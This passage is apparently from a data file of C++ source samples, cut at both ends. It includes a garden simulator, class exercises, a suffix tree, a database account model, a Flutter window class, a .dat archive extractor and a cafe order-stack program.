== 'y') {\n\t\t\t\t\tcetak_kebun();\n\t\t\t\t}\n\n\t\t\t\tdo {\n\t\t\t\t\tcout << endl << \"Apakah lanjut tebang (y/n)? \";\n\t\t\t\t\tcin >> pilih;\n\t\t\t\t\tpilih = tolower(pilih);\n\t\t\t\t} while (pilih != 'n' && pilih != 'y');\n\n\t\t\t} while (pilih != 'n');\n            system(\"clear\");\n\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcetak_kebun();\n\n\t\t\tdo {\n\t\t\t\tdo {\n\t\t\t\t\tcout << \"\\nIngin mengulang lihat kebun (y/n)? \";\n\t\t\t\t\tcin >> pilih;\n\t\t\t\t\tpilih = tolower(pilih);\n\t\t\t\t} while (pilih != 'n' && pilih != 'y');\n\n\t\t\t\tif (pilih == 'y') {\n\t\t\t\t\ttumbuh();\n\n\t\t\t\t\tcetak_kebun();\n\t\t\t\t}\n\n\t\t\t} while (pilih != 'n');\n            system(\"clear\");\n\n\t\t\tbreak;\n\t\t}\n\t} while (pilih_menu != 4);\n\n\treturn 0;\n}\n\nvoid tanam(int baris, int kolom) {\n\tif (kebun[baris - 1][kolom - 1] == 0) {\n\t\tkebun[baris - 1][kolom - 1] = 1;\n\t}\n\telse {\n\t\tcout << endl << \"Lokasi tersebut sudah ada tanaman\" << endl;\n\t}\n}\n\nvoid tebang(int baris, int kolom) {\n\tkebun[baris - 1][kolom - 1] = 0;\n}\n\nvoid tumbuh() {\n\tint kebun_baru[5][5];\n\n\tfor (int i = 0; i < panjang_kebun; i++) {\n\t\tfor (int j = 0; j < lebar_kebun; j++) {\n\t\t\tif (kebun[i][j] == 1) { // Jika masih biji\n\t\t\t\tkebun[i][j] = 2;\n\t\t\t}\n\t\t\telse if (kebun[i][j] == 2) { // Jika masih benih\n\t\t\t\tkebun[i][j] = 3;\n\t\t\t}\n\t\t\telse if (kebun[i][j] == 3) { // Jika masih benih\n\t\t\t\tkebun[i][j] = 4;\n\n\t\t\t\tint baris_baru;\n\t\t\t\tint kolom_baru;\n\n\t\t\t\tdo {\n\t\t\t\t\tsrand(time(NULL));\n\t\t\t\t\tint r = rand() % (8 - 0 + 1) + 0;\n\n\t\t\t\t\tif (r == 0) {\n\t\t\t\t\t\tbaris_baru = i - 1;\n\t\t\t\t\t\tkolom_baru = j - 1;\n\t\t\t\t\t}\n\t\t\t\t\telse if (r == 1) {\n\t\t\t\t\t\tbaris_baru = i - 1;\n\t\t\t\t\t\tkolom_baru = j;\n\t\t\t\t\t}\n\t\t\t\t\telse if (r == 2) {\n\t\t\t\t\t\tbaris_baru = i - 1;\n\t\t\t\t\t\tkolom_baru = j + 1;\n\t\t\t\t\t}\n\t\t\t\t\telse if (r == 3) {\n\t\t\t\t\t\tbaris_baru = i;\n\t\t\t\t\t\tkolom_baru = j - 1;\n\t\t\t\t\t}\n\t\t\t\t\telse if (r == 4) {\n\t\t\t\t\t\tbaris_baru = i;\n\t\t\t\t\t\tkolom_baru = j;\n\t\t\t\t\t}\n\t\t\t\t\telse if (r == 5) {\n\t\t\t\t\t\tbaris_baru = i;\n\t\t\t\t\t\tkolom_baru = j + 1;\n\t\t\t\t\t}\n\t\t\t\t\telse if (r == 6) {\n\t\t\t\t\t\tbaris_baru = i + 1;\n\t\t\t\t\t\tkolom_baru = j - 1;\n\t\t\t\t\t}\n\t\t\t\t\telse if (r == 7) {\n\t\t\t\t\t\tbaris_baru = i + 1;\n\t\t\t\t\t\tkolom_baru = j;\n\t\t\t\t\t}\n\t\t\t\t\telse if (r == 8) {\n\t\t\t\t\t\tbaris_baru = i + 1;\n\t\t\t\t\t\tkolom_baru = j + 1;\n\t\t\t\t\t}\n\t\t\t\t} while (baris_baru < 0 || baris_baru > 4 || kolom_baru < 0 || kolom_baru > 4 || kebun[baris_baru][kolom_baru] != 0); // validasi agar tidak melebihi batas kebun\n\n\t\t\t\tkebun_baru[baris_baru][kolom_baru] = 1;\n\t\t\t}\n\t\t}\n\t}\n\n\tfor (int i = 0; i < panjang_kebun; i++) {\n\t\tfor (int j = 0; j < lebar_kebun; j++) {\n\t\t\tif (kebun_baru[i][j] == 1) kebun[i][j] = 1;\n\t\t}\n\t}\n}\n\nvoid cetak_kebun() {\n\tcout << endl << endl;\n\tfor (int i = 0; i < panjang_kebun; i++) {\n\t\tcout << \"\\t| \";\n\t\tfor (int j = 0; j < lebar_kebun; j++) {\n\t\t\ttanaman(kebun[i][j]);\n\t\t}\n\t\tcout << \"|\" << endl;\n\t}\n\tcout << endl << endl;\n}\n\nvoid menu() {\n\tcout << endl << endl;\n\tcout << \"* Simulator Kebun *\" << endl;\n\tcout << \"1. Tanam\" << endl;\n\tcout << \"2. Tebang (Buang)\" << endl;\n\tcout << \"3. Lihat Kebun\" << endl;\n\tcout << \"4. Exit\" << endl << endl;\n\tcout << \"Pilih menu : \";\n\n}\n\nvoid tanaman(int status) {\n\tif (status == 0) {\n\t\tcout << \" \";\n\t}\n\telse if (status == 1) {\n\t\tcout << \".\";\n\t}\n\telse if (status == 2) {\n\t\tcout << \"v\";\n\t}\n\telse if (status == 3) {\n\t\tcout << \"0\";\n\t}\n\telse if (status == 4) {\n\t\tcout << \"X\";\n\t}\n\n\tcout << \" \";\n}\n",
    "<<<<<<< HEAD\n#include <iostream>\nusing namespace std;\n\n// BASIC TEMPLATE OF CLASS\n// class names {\n//     public:\n//     int a,b,c;\n//     void fnc() {\n//         cout << \"a is: \" << a << endl;\n//         cout << \"b is: \" << b << endl;\n//         cout << \"c is: \" << c << endl;\n//    \t}\n// \tnames(int one, int two, int three) {\n//     \ta = one;\n//     \tb = two;\n//     \tc = three;\n//     }\n// };\n// int main() {\n//     names a1( 100, 200, 300 );\n//     a1.fnc();\n//     names a2( 111, 222, 333 );\n//     a2.fnc();\n//     return 0;\n// }\n\n// QUESTION 1\n// WRITE A CLASS THAT CONTAINS TWO INTEGERS DATA MEMBERS WHICH ARE INITIALIZED BY 50 AND 100 IN CONSTRUCTOR.\n// IT HAS MEMBER FUNCTION product() THAT DISPLAYS THE PRODUCT OF DATA MEMBERS.\n\n// SOLUTION 1\n// class Data {\n// private:\n//    int n1;\n//    int n2;\n// public:\n//    Data() {\n//        n1 = 50;\n//        n2 = 100;\n//    }\n//    void product() {\n//        int result = n1 * n2;\n//        cout << \"The Product is: \" << result;\n//    }\n// };\n// int main() {\n//    Data output;\n//    output.product();\n//    return 0;\n// }\n\n// QUESTION 2\n// DECLARE A CLASS NAME Marks WITH 3 DATA MEMBERS TO STORE MARKS OF THREE SUBJECTS, MAKE FUNCTIONS input() to input\n// details, sum() to display sum of all marks, avg() to calculate and return avg of all subjects.\n\n// SOLUTION 2 -- 1st Method\n// class marks {\n//\tprivate:\n//\t\tfloat a,b,c;\n//\tpublic:\n//\t\tinput() {\n//\t\t\tcout << \"Enter Marks: \";\n//\t\t\tcin >> a >> b >> c;\n//\t\t}\n//\t\tvoid sum() {\n//\t\t\tcout << \"Sum is: \" << a + b + c << endl;\n//\t\t}\n//\t\tvoid avg() {\n//\t\t\tcout << \"Average is: \" << (a + b + c) / 3;\n//\t\t}\n// };\n// int main() {\n//\tmarks m;\n//\tm.input();\n//\tm.sum();\n//\tm.avg();\t\n// }\n\n// SOLUTION 2 -- 2nd Method\n// class Marks {\n// private:\n//    int marks1;\n//    int marks2;\n//    int marks3;\n// public:\n//    int input() {\n//        cout << \"Enter marks in three subjects: \\n\"; \n//        cin >> marks1 >> marks2 >> marks3;\n//        return 0;\n//    }\n//    int sum() {\n//        return marks1 + marks2 + marks3;\n//    }\n//    int avg() {\n//        return (marks1 + marks2 + marks3)/3;\n//    }\n// };\n// int main() {\n//    Marks show;\n//    show.input();\n//    int total = show.sum();\n//    int average = show.avg();\n//    cout << \"Total marks: \" << total << endl;\n//    cout << \"Average marks: \" << average << endl;\n//    return 0;\n// }\n\n// QUESTION 3\n// DECLARE CLASS NAME Player WHICH HAS ATTRIBUTES pName, pAvg, pTeam.MAKE TWO FUNCTIONS input() for details AND\n// output() to show details.KEEP RUNNING PROGRAM UNTIL USER PRESSING Y/y.\n\n// SOLUTION 3\n// class Player {\n// \tstring pName;\n// \tint pAvg;\n// \tstring pTeam;\n// \tpublic:\n// \t\tvoid input() {\n// \t\t\tcout << \"Enter player's name : \"; \n// \t\t\tcin >> pName;\n// \t\t\tcout << \"Enter player's average : \"; \n// \t\t\tcin >> pAvg;\n// \t\t\tcout << \"Enter player's team : \"; \n// \t\t\tcin >> pTeam;\n//\t\t}\n//\t\tvoid output() {\n//\t\t\tcout << \"\\nEntered Details are :- \\n\";\n//\t\t\tcout << \"Player's name : \" << pName <<endl; \n// \t\t\tcout << \"Player's average : \" << pAvg << endl; \n// \t\t\tcout << \"Player's team : \" << pTeam << endl;\n//\t\t}\n// };\n// int main() {\n// \t\tPlayer p1;\n//\t \tp1.input();\n//\t \tp1.output();\n// \t\n// \twhile(true) {\n// \t\tchar doAgain;\n// \t\tcout << \"\\nDo you want to enter details again? :\";\n// \t\tcin >> doAgain;\n// \t\t\n// \t\tif( doAgain == 'Y' || doAgain == 'y' ) {\n// \t\t\tp1.input();\n// \t\t\tp1.output();\n//\t\t} else {\n//\t\t\tbreak;\n//\t\t}\n// \t}\n// }\n\n// QUESTION 4\n// DECLARE A CLASS NAME Notebook WITH 3 DATA MEMEBERS bookId, bookName AND bookPrice. INPUT VALUES TO \n// THE DATA MEMBERS IN THE CONSTRUCTOR, WRITE A Display() FUNCTION THAT DISPLAYS THE DETAILS OF THE BOOK.\n// CREATE 2 OBJECTS OF Notebook CLASS.ADD THE PRICE OF BOTH BOOKS, IF SUM IS EVEN DISPLAY DETAILS OF FIRST \n// BOOK, OTHERWISE DISPLAY DETAILS OF SECOND BOOK.\n\n// SOLUTION 4\n// class Notebook { \n// \tprivate: \n//\t \tstring bookName;\n//\t \tfloat bookPrice;\n//\t \tint bookId;\n//\tpublic: \n// \tNotebook() {\n// \t\tcout << \"Enter Book Name: \";\n// \t\tcin >> bookName;\n// \t\tcout << \"Enter Book Price: \";\n// \t\tcin >> bookPrice;\n// \t\tcout << \"Enter Book Id: \";\n// \t\tcin >> bookId;\n//\t}\n//\tint display() {\n//\t\tcout << \"Book Name is \" << bookName << endl;\n//\t\tcout << \"Book Price is \" << bookPrice << endl;\n//\t\tcout << \"Book Id is \" << bookId << endl;\n//\t\treturn 0;\n//\t}\n//\tfloat getPrice() {\n//        return bookPrice;\n//    }\n// };\n// int main() {\n// \tNotebook n1, n2;\n// \tint sum = n1.getPrice() + n2.getPrice();\n//\t\n//\tif( sum % 2 == 0 ) {\n//\t\tcout << \"Sum is even, details of first book are: \" << endl;\n//\t\tn1.display();\n//\t} else {\n//\t\tcout << \"Sum is odd, details of second book are: \" << endl;\n//\t\tn2.display();\n//\t}\n//\treturn 0;\n// }\n\n// QUESTION 5\n// DECLARE A CLASS Array THAT CONTAINS ARRAY OF 5 NUMBERS AND FOLLOWING MEMBER FUMCTIONS: \n// input() to take 5 input from user, function display() to display them, max() to show max number in array\n// and min() to show minimum number in array.\n\n// SOLUTION 5 -- 1st Method\n// class array {\n//\tpublic:\n//\tint numbers[5];\n//\tvoid input(",
    "//\r\n// Created by Suhaila on 5/18/2024.\r\n//\r\n\r\n#include <string.h>\r\n#include <stdlib.h>\r\n\r\n#include <vector>\r\nusing namespace std;\r\n\r\n#define MAX_CHAR 256\r\n\r\nstruct Node {\r\n    Node *children[MAX_CHAR];\r\n    Node *suffixLink;\r\n    int start;\r\n    int *end;\r\n    int suffixIndex;\r\n};\r\n\r\n\r\nchar text[10000]; // Increased size for larger input strings\r\nNode *root = NULL;\r\nNode *lastNewNode = NULL;\r\nNode *activeNode = NULL;\r\nint activeEdge = -1;\r\nint activeLength = 0;\r\nint remainingSuffixCount = 0;\r\nint leafEnd = -1;\r\nint *rootEnd = NULL;\r\nint *splitEnd = NULL;\r\nint size = -1;\r\nint size1 = 0;\r\n\r\nNode *newNode(int start, int *end) {\r\n    Node *node = (Node*) malloc(sizeof(Node));\r\n    for (int i = 0; i < MAX_CHAR; i++) {\r\n        node->children[i] = NULL;\r\n    }\r\n    node->suffixLink = root;\r\n    node->start = start;\r\n    node->end = end;\r\n    node->suffixIndex = -1;\r\n    return node;\r\n}\r\n\r\nint edgeLength(Node *n) {\r\n    if (n == root) return 0;\r\n    return *(n->end) - (n->start) + 1;\r\n}\r\n\r\nint walkDown(Node *currNode) {\r\n    if (activeLength >= edgeLength(currNode)) {\r\n        activeEdge += edgeLength(currNode);\r\n        activeLength -= edgeLength(currNode);\r\n        activeNode = currNode;\r\n        return 1;\r\n    }\r\n    return 0;\r\n}\r\n\r\nvoid extendSuffixTree(int pos) {\r\n    leafEnd = pos;\r\n    remainingSuffixCount++;\r\n    lastNewNode = NULL;\r\n\r\n    while (remainingSuffixCount > 0) {\r\n        if (activeLength == 0) activeEdge = pos;\r\n\r\n        if (activeNode->children[(unsigned char) text[activeEdge]] == NULL) {\r\n            activeNode->children[(unsigned char) text[activeEdge]] = newNode(pos, &leafEnd);\r\n            if (lastNewNode != NULL) {\r\n                lastNewNode->suffixLink = activeNode;\r\n                lastNewNode = NULL;\r\n            }\r\n        } else {\r\n            Node *next = activeNode->children[(unsigned char) text[activeEdge]];\r\n            if (walkDown(next)) continue;\r\n\r\n            if (text[next->start + activeLength] == text[pos]) {\r\n                if (lastNewNode != NULL && activeNode != root) {\r\n                    lastNewNode->suffixLink = activeNode;\r\n                    lastNewNode = NULL;\r\n                }\r\n                activeLength++;\r\n                break;\r\n            }\r\n\r\n            splitEnd = (int*) malloc(sizeof(int));\r\n            *splitEnd = next->start + activeLength - 1;\r\n            Node *split = newNode(next->start, splitEnd);\r\n            activeNode->children[(unsigned char) text[next->start]] = split;\r\n\r\n            split->children[(unsigned char) text[pos]] = newNode(pos, &leafEnd);\r\n            next->start += activeLength;\r\n            split->children[(unsigned char) text[next->start]] = next;\r\n\r\n            if (lastNewNode != NULL) lastNewNode->suffixLink = split;\r\n            lastNewNode = split;\r\n        }\r\n\r\n        remainingSuffixCount--;\r\n        if (activeNode == root && activeLength > 0) {\r\n            activeLength--;\r\n            activeEdge = pos - remainingSuffixCount + 1;\r\n        } else if (activeNode != root) {\r\n            activeNode = activeNode->suffixLink;\r\n        }\r\n    }\r\n}\r\n\r\nvoid setSuffixIndexByDFS(Node *n, int labelHeight) {\r\n    if (n == NULL) return;\r\n\r\n    int leaf = 1;\r\n    for (int i = 0; i < MAX_CHAR; i++) {\r\n        if (n->children[i] != NULL) {\r\n            leaf = 0;\r\n            setSuffixIndexByDFS(n->children[i], labelHeight + edgeLength(n->children[i]));\r\n        }\r\n    }\r\n    if (leaf == 1) {\r\n        n->suffixIndex = ::size - labelHeight; // Use the global variable 'size'\r\n    }\r\n}\r\n\r\n\r\nvoid buildSuffixTree() {\r\n    ::size = strlen(text);\r\n    rootEnd = (int*) malloc(sizeof(int));\r\n    *rootEnd = -1;\r\n    root = newNode(-1, rootEnd);\r\n    activeNode = root;\r\n    for (int i = 0; i < ::size; i++) extendSuffixTree(i);\r\n    setSuffixIndexByDFS(root, 0);\r\n}\r\n\r\n",
    "#include \"account.model.h\"\n\nvoid AccountModel::createTable(DatabaseConfig& dbConfig)\n{\n    const std::string createAccountTableQuery =\n        R\"(CREATE TABLE IF NOT EXISTS accounts (\n            id INT PRIMARY KEY AUTO_INCREMENT,\n            username VARCHAR(255) NOT NULL,\n            password VARCHAR(255) NOT NULL,\n            fullname VARCHAR(255) NOT NULL,\n            email VARCHAR(255) NOT NULL,\n            avatar VARCHAR(255) NOT NULL,\n            phone VARCHAR(255) NOT NULL,\n            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n        );)\";\n\n    dbConfig.executeQuery(createAccountTableQuery);\n    std::cout << \"accounts table created or already exists.\" << std::endl;\n}\n\nvoid AccountModel::insertAccount(DatabaseConfig& dbConfig,\n                                 const std::string& username,\n                                 const std::string& password,\n                                 const std::string& fullname,\n                                 const std::string& email,\n                                 const std::string& phone,\n                                 const std::string& avatar)\n{\n    const std::string insertAccountQuery = R\"(\n        INSERT INTO accounts(username, password, fullname, email, phone, avatar) VALUES (?,?,?,?,?,?);\n    )\";\n\n    auto conn = dbConfig.getConnection();\n    std::unique_ptr<sql::PreparedStatement> pstmt(\n        conn->prepareStatement(insertAccountQuery));\n    pstmt->setString(1, username);\n    pstmt->setString(2, password);\n    pstmt->setString(3, fullname);\n    pstmt->setString(4, email);\n    pstmt->setString(5, phone);\n    pstmt->setString(6, avatar);\n\n    pstmt->executeUpdate();\n\n    std::cout << \"Account inserted successfully.\" << std::endl;\n}\n\nstd::vector<Account> AccountModel::getAllAccount(DatabaseConfig& dbConfig)\n{\n    const std::string getAllQuery =\n        R\"(SELECT id, username, fullname, email, phone, avatar FROM accounts;)\";\n\n    auto conn = dbConfig.getConnection();\n    std::vector<Account> accounts;\n\n    try\n    {\n        std::unique_ptr<sql::Statement> stmt(conn->createStatement());\n        std::unique_ptr<sql::ResultSet> res(stmt->executeQuery(getAllQuery));\n\n        while (res->next())\n        {\n            Account account;\n            account.id = res->getInt(\"id\");\n            account.username = res->getString(\"username\");\n            account.fullname = res->getString(\"fullname\");\n            account.email = res->getString(\"email\");\n            account.phone = res->getString(\"phone\");\n            account.avatar = res->getString(\"avatar\");\n            accounts.push_back(account);\n        }\n    }\n    catch (const std::exception& e)\n    {\n        std::cerr << \"Error fetching accounts: \" << e.what() << std::endl;\n    }\n\n    return accounts;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\ufeff#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <string>\r\n#include <cstdint>\r\n#include <filesystem>\r\n#include <algorithm>\r\n#include <map>\r\n#include <iomanip>\r\n\r\nnamespace fs = std::filesystem;\r\n\r\nstruct FileEntry {\r\n    std::string filename;\r\n    uint32_t offset;\r\n    uint32_t unpacked_size;\r\n    uint32_t packed_size;\r\n};\r\n\r\nclass DatExtractor {\r\npublic:\r\n    DatExtractor(const std::string& datPath) : m_datPath(datPath) {}\r\n\r\n    bool Extract(const std::string& outputDir) {\r\n        std::ifstream file(m_datPath, std::ios::binary);\r\n        if (!file) {\r\n            std::cerr << \"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6: \" << m_datPath << std::endl;\r\n            return false;\r\n        }\r\n\r\n        // \u68c0\u67e5\u6587\u4ef6\u5934\r\n        char signature[8];\r\n        file.read(signature, 8);\r\n\r\n        bool isYanepkDx = (memcmp(signature, \"yanepkDx\", 8) == 0);\r\n        bool isYanepkEx = (memcmp(signature, \"yanepkEx\", 8) == 0);\r\n\r\n        if (!isYanepkDx && !isYanepkEx) {\r\n            std::cerr << \"\u4e0d\u652f\u6301\u7684\u6587\u4ef6\u683c\u5f0f\" << std::endl;\r\n            return false;\r\n        }\r\n\r\n        // \u8bfb\u53d6\u6587\u4ef6\u6570\u91cf\r\n        uint32_t count;\r\n        file.seekg(8);\r\n        file.read(reinterpret_cast<char*>(&count), 4);\r\n\r\n        if (count > 10000) { // \u5b89\u5168\u68c0\u67e5\r\n            std::cerr << \"\u6587\u4ef6\u6570\u91cf\u5f02\u5e38\" << std::endl;\r\n            return false;\r\n        }\r\n\r\n        // \u8bfb\u53d6\u6587\u4ef6\u6761\u76ee\r\n        std::vector<FileEntry> entries;\r\n        entries.reserve(count);\r\n\r\n        uint32_t nameLength = isYanepkDx ? 0x100 : 0x20;\r\n        uint32_t indexOffset = 0xC;\r\n\r\n        for (uint32_t i = 0; i < count; ++i) {\r\n            FileEntry entry;\r\n\r\n            // \u8bfb\u53d6\u6587\u4ef6\u540d\r\n            std::vector<char> nameBuffer(nameLength);\r\n            file.seekg(indexOffset);\r\n            file.read(nameBuffer.data(), nameLength);\r\n            entry.filename = std::string(nameBuffer.data());\r\n\r\n            // \u8bfb\u53d6\u6587\u4ef6\u4fe1\u606f\r\n            file.seekg(indexOffset + nameLength);\r\n            file.read(reinterpret_cast<char*>(&entry.offset), 4);\r\n            file.read(reinterpret_cast<char*>(&entry.unpacked_size), 4);\r\n            file.read(reinterpret_cast<char*>(&entry.packed_size), 4);\r\n\r\n            entries.push_back(entry);\r\n            indexOffset += nameLength + 0xC;\r\n        }\r\n\r\n        // \u521b\u5efa\u8f93\u51fa\u76ee\u5f55\r\n        fs::create_directories(outputDir);\r\n\r\n        // \u63d0\u53d6\u6587\u4ef6\r\n        for (const auto& entry : entries) {\r\n            if (entry.filename.empty()) continue;\r\n\r\n            // \u521b\u5efa\u8f93\u51fa\u8def\u5f84\r\n            std::string outPath = outputDir + \"\\\\\" + entry.filename;\r\n            fs::path dirPath = fs::path(outPath).parent_path();\r\n            fs::create_directories(dirPath);\r\n\r\n            // \u8bfb\u53d6\u5e76\u5199\u5165\u6587\u4ef6\u6570\u636e\r\n            std::vector<char> buffer(entry.packed_size);\r\n            file.seekg(entry.offset);\r\n            file.read(buffer.data(), entry.packed_size);\r\n\r\n            std::ofstream outFile(outPath, std::ios::binary);\r\n            if (!outFile) {\r\n                std::cerr << \"\u65e0\u6cd5\u521b\u5efa\u6587\u4ef6: \" << outPath << std::endl;\r\n                continue;\r\n            }\r\n            outFile.write(buffer.data(), entry.packed_size);\r\n\r\n            std::cout << \"\u5df2\u63d0\u53d6: \" << entry.filename << std::endl;\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\nprivate:\r\n    std::string m_datPath;\r\n};\r\n\r\nclass DatUpdater {\r\npublic:\r\n    DatUpdater(const std::string& datPath) : m_datPath(datPath) {}\r\n\r\n    bool Update(const std::string& updateDir, const std::string& outputPath) {\r\n        std::ifstream file(m_datPath, std::ios::binary);\r\n        if (!file) {\r\n            std::cerr << \"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6: \" << m_datPath << std::endl;\r\n            return false;\r\n        }\r\n\r\n        // \u68c0\u67e5\u6587\u4ef6\u5934\r\n        char signature[8];\r\n        file.read(signature, 8);\r\n\r\n        bool isYanepkDx = (memcmp(signature, \"yanepkDx\", 8) == 0);\r\n        bool isYanepkEx = (memcmp(signature, \"yanepkEx\", 8) == 0);\r\n\r\n        if (!isYanepkDx && !isYanepkEx) {\r\n            std::cerr << \"\u4e0d\u652f\u6301\u7684\u6587\u4ef6\u683c\u5f0f\" << std::endl;\r\n            return false;\r\n        }\r\n\r\n        // \u8bfb\u53d6\u6587\u4ef6\u6570\u91cf\r\n        uint32_t count;\r\n        file.seekg(8);\r\n        file.read(reinterpret_cast<char*>(&count), 4);\r\n\r\n        if (count > 10000) { // \u5b89\u5168\u68c0\u67e5\r\n            std::cerr << \"\u6587\u4ef6\u6570\u91cf\u5f02\u5e38\" << std::endl;\r\n            return false;\r\n        }\r\n\r\n        // \u8bfb\u53d6\u6587\u4ef6\u6761\u76ee\r\n        std::vector<FileEntry> entries;\r\n        entries.reserve(count);\r\n\r\n        uint32_t nameLength = isYanepkDx ? 0x100 : 0x20;\r\n        uint32_t indexOffset = 0xC;\r\n        uint32_t dataOffset = indexOffset + count * (nameLength + 0xC);\r\n\r\n        std::cout << \"\u5c01\u5305\u4e2d\u7684\u6587\u4ef6\u5217\u8868\uff1a\" << std::endl;\r\n        std::cout << std::setw(5) << \"\u5e8f\u53f7\" << std::setw(50) << \"\u6587\u4ef6\u540d\" << std::setw(15) << \"\u5927\u5c0f\" << std::endl;\r\n        std::cout << std::string(70, '-') << std::endl;\r\n\r\n        for (uint32_t i = 0; i < count; ++i) {\r\n            FileEntry entry;\r\n\r\n            // \u8bfb\u53d6\u6587\u4ef6\u540d\r\n            std::vector<char> nameBuffer(nameLength);\r\n            file.seekg(indexOffset);\r\n            file.read(nameBuffer.data(), nameLength);\r\n            entry.filename = std::string(nameBuffer.data());\r\n\r\n            // \u8bfb\u53d6\u6587\u4ef6\u4fe1\u606f\r\n            file.seekg(indexOffset + nam",
    "#include <iostream>\n#include <string>\n#include <limits>\n\nusing namespace std;\n\nvoid clearConsole()\n{\n    system(\"cls\");\n}\nvoid menu()\n{\ncout << \"1. Tea (7.5 EGP)\\n\";\ncout << \"2. Coffee (15 EGP)\\n\";\ncout << \"3. Nescafe (20 EGP)\\n\";\ncout << \"4. Sahlab (20 EGP)\\n\";\ncout << \"5. Sahlab nuts (27 EGP)\\n\";\ncout << \"6. Anise (15 EGP)\\n\";\ncout << \"7. Mango Drink (30 EGP)\\n\";\ncout << \"8. Grape Drink (20 EGP)\\n\";\ncout << \"9. Tea and Milk (15 EGP)\\n\";\ncout << \"10. Pepsi - Cola  Drink (15 EGP)\\n\";\ncout << \"11. Shesha Fruits (20 EGP)\\n\";\ncout << \"12. Shesha (10 EGP)\\n\";\ncout << \"0. Done placing orders\\n\";\ncout << \"Enter product number to add to order (0 to finish): \";\n}\nvoid waitForEnter()\n{\n    cout << \"\\n\\nPress Enter to continue...\\n\";\n    cout.flush();\n    cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n    cin.get();\n    clearConsole();\n}\n\nclass Node\n{\npublic:\n    string order;\n    float price;\n    Node* next;\n\n    Node(string order, float price)\n    {\n        this->order=order;\n        this->price=price;\n        this->next=nullptr;\n    }\n};\n\nclass Stack\n{\nprivate:\n    Node* top;\n\n\npublic:\n    float totalPrice;\n    Stack()\n    {\n        this->totalPrice=0;\n        this->top=nullptr;\n    }\n    void deleteOrder(const string &orderName)\n{\n    if (isEmpty())\n    {   clearConsole();\n\n        cout << \"No orders to delete.\\n\";\n        waitForEnter();\n        return;\n    }\n\n    Node *current = top;\n    Node *prev = nullptr;\n\n    while (current != nullptr && current->order != orderName)\n    {\n        prev = current;\n        current = current->next;\n    }\n\n\n    if (current != nullptr)\n    {\n\n        if (prev == nullptr)\n        {\n            top = current->next;\n        }\n        else\n        {\n            prev->next = current->next;\n        }\n        totalPrice -= current->price;\n        delete current;\n        clearConsole();\n        cout << \"Order \\\"\" << orderName << \"\\\" deleted successfully.\\n\";\n        display();\n        waitForEnter();\n    }\n    else\n    {   clearConsole();\n        cout << \"Order \\\"\" << orderName << \"\\\" not found.\\n\";\n        waitForEnter();\n    }\n}\n    void sortOrders(bool byPrice, bool ascending)\n{\n    if (isEmpty())\n    {   clearConsole();\n        cout << \"No orders to sort.\\n\";\n        waitForEnter();\n        return;\n    }\n\n    int size = 0;\n    Node *current = top;\n    while (current != nullptr)\n    {\n        size++;\n        current = current->next;\n    }\n\n    Node **ordersArray = new Node *[size];\n    current = top;\n    for (int i = 0; i < size; i++)\n    {\n        ordersArray[i] = current;\n        current = current->next;\n    }\n\n    for (int i = 0; i < size - 1; i++)\n    {\n        for (int j = 0; j < size - i - 1; j++)\n        {\n            bool swapNeeded = false;\n            if (byPrice)\n            {\n                if (ascending)\n                {\n                    if (ordersArray[j]->price > ordersArray[j + 1]->price)\n                        swapNeeded = true;\n                }\n                else\n                {\n                    if (ordersArray[j]->price < ordersArray[j + 1]->price)\n                        swapNeeded = true;\n                }\n            }\n            else\n            {\n                if (ascending)\n                {\n                    if (ordersArray[j]->order > ordersArray[j + 1]->order)\n                        swapNeeded = true;\n                }\n                else\n                {\n                    if (ordersArray[j]->order < ordersArray[j + 1]->order)\n                        swapNeeded = true;\n                }\n            }\n\n            if (swapNeeded)\n            {\n                Node *temp = ordersArray[j];\n                ordersArray[j] = ordersArray[j + 1];\n                ordersArray[j + 1] = temp;\n            }\n        }\n    }\n    top = nullptr;\n    for (int i = 0; i < size; i++)\n    {\n        Node* newNode = new Node(ordersArray[i]->order, ordersArray[i]->price);\n        newNode->next = top;\n        top = newNode;\n    }\n    clearConsole();\n\n    delete[] ordersArray;\n    cout<<\"Orders Sorted Successfully.\\n\";\n    display();\n    waitForEnter();\n}\n    void push(string order, float price)\n    {\n        clearConsole();\n        Node* newNode = new Node(order, price);\n        newNode->next = top;\n        top = newNode;\n        totalPrice += price;\n        cout << \"Order placed successfully: \" << order << \" (Price: \" << price << \" EGP)\\n\";\n    }\n\n    void popLast()\n    {\n        string choice;\n        if (isEmpty())\n        {\n            cout << \"No orders to process.\\n\";\n            waitForEnter();\n            return;\n        }\n\n        cout << \"Are you sure you want to delete the last order ? (last order is : \" << top->order << \" )\\nEnter Y/y for confirming or anything else to get back: \";\n        cin >> choice;\n        if (choice == \"Y\" || choice == \"y\")\n        